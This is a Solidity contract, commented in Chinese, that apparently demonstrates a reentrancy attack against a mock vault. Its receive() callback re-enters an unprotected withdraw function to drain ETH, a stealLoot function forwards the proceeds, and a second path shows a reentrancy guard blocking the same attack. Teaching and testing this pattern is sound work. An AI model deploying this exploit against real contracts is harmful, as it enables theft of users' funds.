// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/// @notice Vault 合约接口（攻击目标）
interface IVault {
    function deposit() external payable;
    function vulnerableWithdraw() external;
    function safeWithdraw() external;
}

/// @title GoldThief - 模拟重入攻击者
contract GoldThief {
    IVault public targetVault;   // 被攻击的 Vault 合约
    address public owner;        // 攻击者地址
    uint256 public attackCount;  // 攻击计数器
    bool public attackingSafe;   // 是否攻击受保护的函数

    /// @notice 构造函数，设置目标 Vault
    constructor(address _vaultAddress) {
        targetVault = IVault(_vaultAddress);
        owner = msg.sender;
    }

    /// @notice 发起对不安全函数的攻击（vulnerableWithdraw）
    function attackVulnerable() external payable {
        require(msg.sender == owner, "Only owner");
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");

        attackingSafe = false;
        attackCount = 0;

        targetVault.deposit{value: msg.value}();   // 先存入 ETH
        targetVault.vulnerableWithdraw();          // 启动首次提款，进入重入流程
    }

    /// @notice 尝试攻击有防重入保护的函数（safeWithdraw）【应失败】
    function attackSafe() external payable {
        require(msg.sender == owner, "Only owner");
        require(msg.value >= 1 ether, "Need at least 1 ETH");

        attackingSafe = true;
        attackCount = 0;

        targetVault.deposit{value: msg.value}();
        targetVault.safeWithdraw(); // 将失败，触发 reentrancy guard
    }

    /// @notice 回调函数，用于进行重入攻击（递归触发 withdraw）
    receive() external payable {
        attackCount++;

        // 攻击不安全的目标
        if (!attackingSafe && address(targetVault).balance >= 1 ether && attackCount < 5) {
            targetVault.vulnerableWithdraw(); // 重入调用
        }

        // 尝试攻击有保护的函数（应失败）
        if (attackingSafe) {
            targetVault.safeWithdraw(); // 会因为 nonReentrant 被拒绝
        }
    }

    /// @notice 将合约中偷到的资金转回给攻击者地址
    function stealLoot() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }

    /// @notice 查看攻击合约当前余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
